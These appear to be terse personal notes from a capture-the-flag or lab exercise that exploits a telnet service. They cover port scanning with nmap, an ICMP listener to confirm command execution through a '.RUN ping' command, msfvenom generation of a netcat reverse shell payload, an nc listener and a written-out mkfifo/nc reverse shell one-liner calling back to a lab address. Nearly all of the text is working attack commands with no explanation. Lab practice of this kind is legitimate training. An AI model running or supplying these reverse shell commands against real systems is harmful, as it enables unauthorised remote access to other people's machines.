```bash
telnet <IP> <port>
```

for all ports
```bash
nmap -p- <ip>
```

`tcpdump` listener
```bash
sudo tcpdump ip proto \\icmp -i tun0
```

inside telnet
sent 1 ping message
```
.RUN ping <my-local-ip> -c 1
```

generating reverse shell

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R

msfvenom -p cmd/unix/reverse_netcat lhost=10.10.124.127 lport=4444 R
msfvenom -p cmd/unix/reverse_netcat lhost=10.10.242.20 lport=4444 R
```


```bash
nc -lvp 4444
```

mkfifo /tmp/koquey; nc 10.10.242.20 4444 0%3C/tmp/koquey | /bin/sh %3E/tmp/koquey 2>&1; rm /tmp/koquey
